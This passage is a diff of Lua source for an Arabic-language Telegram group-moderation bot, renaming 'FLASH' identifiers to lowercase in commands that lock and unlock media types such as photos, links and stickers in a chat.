+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الدردشه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 55, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:text:mute'..msg.chat_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الدردشه سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الدردشه سابقا ،', 1, 'md')
 end end
 if unmutepts[2] == "الفشار" then
-if FLASHdx1:get(FLASH.."fshar"..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الفشار  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 54, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH.."fshar"..msg.chat_id_)
+if flashdx1:get(flash.."fshar"..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الفشار  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 54, string.len(msg.sender_user_id_))
+flashdx1:del(flash.."fshar"..msg.chat_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الفشار سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الفشار سابقا ،', 1, 'md')
 end end
 if unmutepts[2] == "الطائفيه" then
-if FLASHdx1:get(FLASH.."taf"..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الطائفيه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 56, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH.."taf"..msg.chat_id_)
+if flashdx1:get(flash.."taf"..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الطائفيه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 56, string.len(msg.sender_user_id_))
+flashdx1:del(flash.."taf"..msg.chat_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الطائفيه سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الطائفيه سابقا ،', 1, 'md')
 end end
 if unmutepts[2] == "الكفران" then
-if FLASHdx1:get(FLASH.."kaf"..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الكفران  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 55, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH.."kaf"..msg.chat_id_)
+if flashdx1:get(flash.."kaf"..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الكفران  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 55, string.len(msg.sender_user_id_))
+flashdx1:del(flash.."kaf"..msg.chat_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الكفران سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الكفران سابقا ،', 1, 'md')
 end end
 if unmutepts[2] == "الصور" then
-if FLASHdx1:get(FLASH..'bot:photo:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الصور  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 53, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:photo:mute'..msg.chat_id_)
+if flashdx1:get(flash..'bot:photo:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الصور  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 53, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:photo:mute'..msg.chat_id_)
 else 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الصور سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الصور سابقا ،', 1, 'md')
 end end
 if unmutepts[2] == "الكلايش" then
-if FLASHdx1:get(FLASH..'bot:spam:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الكلايش  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 55, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:spam:mute'..msg.chat_id_)
+if flashdx1:get(flash..'bot:spam:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الكلايش  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 55, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:spam:mute'..msg.chat_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الكلايش سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الكلايش سابقا ،', 1, 'md')
 end end
 if unmutepts[2] == "الفيديو" then
-if FLASHdx1:get(FLASH..'bot:video:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الفيديو  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 55, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:video:mute'..msg.chat_id_)
+if flashdx1:get(flash..'bot:video:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الفيديو  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 55, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:video:mute'..msg.chat_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الفيديو سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الفيديو سابقا ،', 1, 'md')
 end end
 if unmutepts[2] == "الملفات" then
-if FLASHdx1:get(FLASH..'bot:document:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الملفات  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 55, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:document:mute'..msg.chat_id_)
+if flashdx1:get(flash..'bot:document:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الملفات  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 55, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:document:mute'..msg.chat_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الملفات سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الملفات سابقا ،', 1, 'md')
 end end
 if unmutepts[2] == "الاونلاين" then
-if FLASHdx1:get(FLASH..'bot:inline:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الاونلاين  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 57, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:inline:mute'..msg.chat_id_)
+if flashdx1:get(flash..'bot:inline:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الاونلاين  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 57, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:inline:mute'..msg.chat_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الاونلاين سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الاونلاين سابقا ،', 1, 'md')
 end end
 if unmutepts[2] == "الماركداون" then
-if FLASHdx1:get(FLASH..'markdown:lock'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الماركداون  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 58, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'markdown:lock'..msg.chat_id_)
+if flashdx1:get(flash..'markdown:lock'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الماركداون  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 58, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'markdown:lock'..msg.chat_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الماركداون سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الماركداون سابقا ،', 1, 'md')
 end end
 if unmutepts[2] == "المتحركه" then
-if FLASHdx1:get(FLASH..'bot:gifs:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » المتحركه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 56, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:gifs:mute'..msg.chat_id_)
+if flashdx1:get(flash..'bot:gifs:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » المتحركه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 56, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:gifs:mute'..msg.chat_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » المتحركه سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » المتحركه سابقا ،', 1, 'md')
 end end
 if unmutepts[2] == "الاغاني" then
-if FLASHdx1:get(FLASH..'bot:music:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الاغاني  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 55, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:music:mute'..msg.chat_id_)
+if flashdx1:get(flash..'bot:music:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الاغاني  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 55, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:music:mute'..msg.chat_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الاغاني سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الاغاني سابقا ،', 1, 'md')
 end end
 if unmutepts[2] == "الصوت" then
-if FLASHdx1:get(FLASH..'bot:voice:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الصوت  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 53, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:voice:mute'..msg.chat_id_)
+if flashdx1:get(flash..'bot:voice:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الصوت  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 53, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:voice:mute'..msg.chat_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الصوت سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الصوت سابقا ،', 1, 'md')
 end end
 if unmutepts[2] == "الروابط" then
-if FLASHdx1:get(FLASH..'bot:links:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الروابط  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 55, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:links:mute'..msg.chat_id_)
+if flashdx1:get(flash..'bot:links:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الروابط  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 55, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:links:mute'..msg.chat_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الروابط سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الروابط سابقا ،', 1, 'md')
 end end
 if unmutepts[2] == "المواقع" then
-if FLASHdx1:get(FLASH..'bot:location:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » المواقع  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 55, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:location:mute'..msg.chat_id_)
+if flashdx1:get(flash..'bot:location:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » المواقع  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 55, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:location:mute'..msg.chat_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » المواقع سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » المواقع سابقا ،', 1, 'md')
 end end
 if unmutepts[2] == "المعرف" then
-if FLASHdx1:get(FLASH..'tags:lock'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » المعرف  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 54, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'tags:lock'..msg.chat_id_)
+if flashdx1:get(flash..'tags:lock'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » المعرف  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 54, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'tags:lock'..msg.chat_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » المعرف سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » المعرف سابقا ،', 1, 'md')
 end end
 if unmutepts[2] == "الدخول" then
-if FLASHdx1:get(FLASH..'Lock:Join'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الدخول  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 54, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'Lock:Join'..msg.chat_id_)
+if flashdx1:get(flash..'Lock:Join'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الدخول  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 54, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'Lock:Join'..msg.chat_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الدخول سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الدخول سابقا ،', 1, 'md')
 end end
 if unmutepts[2] == "الحمايه" then
-if FLASHdx1:get(FLASH..'bot:strict'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الحمايه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 55, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:strict'..msg.chat_id_)
+if flashdx1:get(flash..'bot:strict'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الحمايه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 55, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:strict'..msg.chat_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الحمايه سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الحمايه سابقا ،', 1, 'md')
 end end
 if unmutepts[2] == "الهاشتاك" then
-if FLASHdx1:get(FLASH..'bot:hashtag:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الهاشتاك  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 56, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:hashtag:mute'..msg.chat_id_)
+if flashdx1:get(flash..'bot:hashtag:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الهاشتاك  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 56, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:hashtag:mute'..msg.chat_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الهاشتاك سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الهاشتاك سابقا ،', 1, 'md')
 end end
 if unmutepts[2] == "الجهات" then
-if FLASHdx1:get(FLASH..'bot:contact:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الجهات  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 54, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:contact:mute'..msg.chat_id_)
+if flashdx1:get(flash..'bot:contact:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الجهات  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 54, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:contact:mute'..msg.chat_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الجهات سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الجهات سابقا ،', 1, 'md')
 end end
 if unmutepts[2] == "الشبكات" then
-if FLASHdx1:get(FLASH..'bot:webpage:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الشبكات  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 55, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:webpage:mute'..msg.chat_id_)
+if flashdx1:get(flash..'bot:webpage:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الشبكات  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 55, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:webpage:mute'..msg.chat_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الشبكات سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الشبكات سابقا ،', 1, 'md')
 end end
 if unmutepts[2] == "العربيه" then
-if FLASHdx1:get(FLASH..'bot:arabic:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » العربيه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 55, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:arabic:mute'..msg.chat_id_)
+if flashdx1:get(flash..'bot:arabic:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » العربيه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 55, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:arabic:mute'..msg.chat_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » العربيه سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » العربيه سابقا ،', 1, 'md')
 end end
 if unmutepts[2] == "الانكليزيه" then
-if FLASHdx1:get(FLASH..'bot:english:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الانكليزيه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 58, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:english:mute'..msg.chat_id_)
+if flashdx1:get(flash..'bot:english:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الانكليزيه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 58, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:english:mute'..msg.chat_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الانكليزيه سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الانكليزيه سابقا ،', 1, 'md')
 end end
 if unmutepts[2] == "الاشعارات" then
-if FLASHdx1:get(FLASH..'bot:tgservice:jk'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الاشعارات  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 57, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:tgservice:jk'..msg.chat_id_)
+if flashdx1:get(flash..'bot:tgservice:jk'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الاشعارات  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 57, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:tgservice:jk'..msg.chat_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الاشعارات سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الاشعارات سابقا ،', 1, 'md')
 end end
 if unmutepts[2] == "الملصقات" then
-if FLASHdx1:get(FLASH..'bot:sticker:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الملصقات  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 56, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:sticker:mute'..msg.chat_id_)
+if flashdx1:get(flash..'bot:sticker:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » الملصقات  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 56, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:sticker:mute'..msg.chat_id_)
 else
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الملصقات سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » الملصقات سابقا ،', 1, 'md')
 end end 
 if unmutepts[2] == "التوجيه" then
-if FLASHdx1:get(FLASH..'bot:forward:mute'..msg.chat_id_) then
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » التوجيه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
-faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, FLASH, 55, string.len(msg.sender_user_id_))
-FLASHdx1:del(FLASH..'bot:forward:mute'..msg.chat_id_)
+if flashdx1:get(flash..'bot:forward:mute'..msg.chat_id_) then
+local flash = '❅∫ رتبتك : '..tar..' \n❅∫ تم فتح » التوجيه  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
+faedrmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, flash, 55, string.len(msg.sender_user_id_))
+flashdx1:del(flash..'bot:forward:mute'..msg.chat_id_)
 else 
-FLASHdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » التوجيه سابقا ،', 1, 'md')
+flashdx(msg.chat_id_, msg.id_, 1, '❅∫ تم فتح » التوجيه سابقا ،', 1, 'md')
 end end end end
---     By Developer FLASH     -- 
+--     By Developer flash     -- 
 if text == ("قفل الكل") and is_momod(msg.sender_user_id_, msg.chat_id_) then
 if is_leaderid(msg.sender_user_id_) then
 tar = 'المطور 🌟'
@@ -7995,33 +7995,33 @@ tar = 'المدير 🥇'
 elseif is_momod(msg.sender_user_id_, msg.chat_id_) then
 tar = 'الادمن 🥈'          
 end 
-FLASHdx1:set(FLASH..'editmsg'..msg.chat_id_,true)
-FLASHdx1:set(FLASH..'bot:cmds'..msg.chat_id_,true)
-FLASHdx1:set(FLASH..'bot:bots:mute'..msg.chat_id_,true)
-FLASHdx1:set(FLASH..'bot:bots:ban'..msg.chat_id_,true)
-FLASHdx1:set(FLASH..'keed_bots'..msg.chat_id_,true)
-FLASHdx1:set(FLASH..'anti-flood:'..msg.chat_id_,true)
-FLASHdx1:set(FLASH..'bot:pin:mute'..msg.chat_id_,true)
-FLASHdx1:set(FLASH..'bot:inline:mute'..msg.chat_id_,true)
-FLASHdx1:set(FLASH..'bot:photo:mute'..msg.chat_id_,true)
-FLASHdx1:set(FLASH..'bot:spam:mute'..msg.chat_id_,true)
-FLASHdx1:set(FLASH..'bot:video:mute'..msg.chat_id_,true)
-FLASHdx1:set(FLASH..'bot:gifs:mute'..msg.chat_id_,true)
-FLASHdx1:set(FLASH..'bot:music:mute'..msg.chat_id_,true)
-FLASHdx1:set(FLASH..'bot:voice:mute'..msg.chat_id_,true)
-FLASHdx1:set(FLASH..'bot:links:mute'..msg.chat_id_,true)
-FLASHdx1:set(FLASH..'bot:location:mute'..msg.chat_id_,true)
-FLASHdx1:set(FLASH..'tags:lock'..msg.chat_id_,true)
-FLASHdx1:set(FLASH..'bot:strict'..msg.chat_id_,true)
-FLASHdx1:set(FLASH..'bot:document:mute'..msg.chat_id_,true)
-FLASHdx1:set(FLASH..'bot:hashtag:mute'..msg.chat_id_,true)
-FLASHdx1:set(FLASH..'bot:contact:mute'..msg.chat_id_,true)
-FLASHdx1:set(FLASH..'bot:webpage:mute'..msg.chat_id_,true)
-FLASHdx1:set(FLASH..'bot:sticker:mute'..msg.chat_id_,true)
-FLASHdx1:set(FLASH..'markdown:lock'..msg.chat_id_,true)
-FLASHdx1:set(FLASH..'bot:forward:mute'..msg.chat_id_,true) 
-local FLASH = '❅∫ رتبتك : '..tar..' \n❅∫ تم قفل » كل الوسائط  \n❅∫ بواسطة ('..msg.sender_user_id_..') '
